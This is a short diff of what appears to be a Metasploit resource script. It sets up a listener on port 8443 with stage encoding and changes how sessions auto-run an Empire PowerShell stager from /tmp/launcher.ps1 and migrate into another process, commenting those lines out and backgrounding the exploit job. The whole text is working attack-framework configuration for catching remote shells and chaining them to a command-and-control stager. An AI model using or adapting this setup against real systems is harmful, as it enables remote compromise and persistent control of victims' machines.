@@ -7,9 +7,9 @@ set LHOST 0.0.0.0
 set LPORT 8443
 set EnableStageEncoding true 
 
-# Automatically run Empire stager, and then migrate - kill original process
-set InitialAutoRunScript post/windows/manage/powershell/exec_psh SCRIPT=/tmp/launcher.ps1 TIMEOUT=-1
-set AutoRunScript post/windows/manage/priv_migrate
+# Automatically migrate and then run Empire stager
+#set AutoRunScript post/windows/manage/priv_migrate
+#set InitialAutoRunScript post/windows/manage/powershell/exec_psh SCRIPT=/tmp/launcher.ps1 TIMEOUT=-1
 
 # Execute
-exploit
+exploit -j
